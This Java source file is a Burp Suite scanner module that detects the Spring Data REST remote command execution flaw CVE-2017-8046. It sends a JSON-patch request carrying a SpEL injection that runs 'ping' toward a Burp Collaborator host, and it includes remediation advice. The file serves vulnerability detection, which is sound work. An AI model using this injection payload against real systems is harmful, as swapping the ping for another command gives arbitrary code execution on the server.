package burp.scan.active.poc;

import burp.*;
import burp.scan.active.ModuleBase;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.Confidence;
import burp.scan.lib.CustomScanIssue;
import burp.scan.lib.HTTPParser;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.PrintWriter;
import java.net.URL;
import java.util.*;

import static burp.scan.lib.HTTPMatcher.isJavaApplicationByURL;
import static burp.scan.lib.HTTPParser.isJSONRequest;

public class SpringBootRestRCE implements ModuleBase, RunOnce {
    private static final String TITLE = "Spring Data REST - Remote Command Execution CVE-2017-8046";
    private static final String DESCRIPTION = "J2EEscan identified the a remote command execution on Spring Data REST (CVE-2017-8046).<br />";
    private static final String REMEDY = "Update the remote library with the last security patches provided by Pivotal:<br />"
            + "<ul><li>https://spring.io/blog/2018/03/06/security-issue-in-spring-data-rest-cve-2017-8046</li></ul>";

    // List of applications already tested, to avoid duplicate scans on the same item
    private static LinkedHashSet hsc = new LinkedHashSet();

    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        var baseRequestResponse = webInfo.getHttpRequestResponse();
        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStdout(), true);

        List<IScanIssue> issues = new ArrayList<>();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = reqInfo.getUrl();

        if (!isJavaApplicationByURL(url)) {
            webInfo.addIssues(issues);
            return ;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");

        if (contentTypeHeader == null) {
            webInfo.addIssues(issues);
            return ;
        }

        // Skip not JSON requests
        if (!isJSONRequest(contentTypeHeader)) {
            webInfo.addIssues(issues);
            return ;
        }

        String host = url.getHost();
        String system = host.concat(url.getPath());

        // System not yet tested for this vulnerability
        if (!hsc.contains(system)) {

            hsc.add(system);

            List<String> headers = reqInfo.getHeaders();
            String firstHeader = headers.get(0);
            headers.set(0, firstHeader.replaceFirst("POST ", "PATCH "));

            List<String> headersWithContentTypePatch = HTTPParser.addOrUpdateHeader(headers, "Content-type", "application/json-patch+json");
            List<String> headersWithContentTypePatchAndAccept = HTTPParser.addOrUpdateHeader(headersWithContentTypePatch, "Accept", "*/*");

            // Collaborator context
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

            // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

            // Payload to trigger remote ping
            String payload = String.format("\\\"ping -c 2 %s\\\"", currentCollaboratorPayload);
            String finalPayload = "[{ \"op\" : \"replace\", \"path\" : \"T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(" + payload + ").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x\", \"value\" : \"j2eescan\" }]";

            byte[] message = helpers.buildHttpMessage(headersWithContentTypePatchAndAccept, finalPayload.getBytes());
            IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

            // Poll Burp Collaborator for remote interaction
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        resp,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Certain
                ));
            }


        }
        webInfo.addIssues(issues);
        return ;
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.SpringBoot_Spring));
        return tags;
    }
}
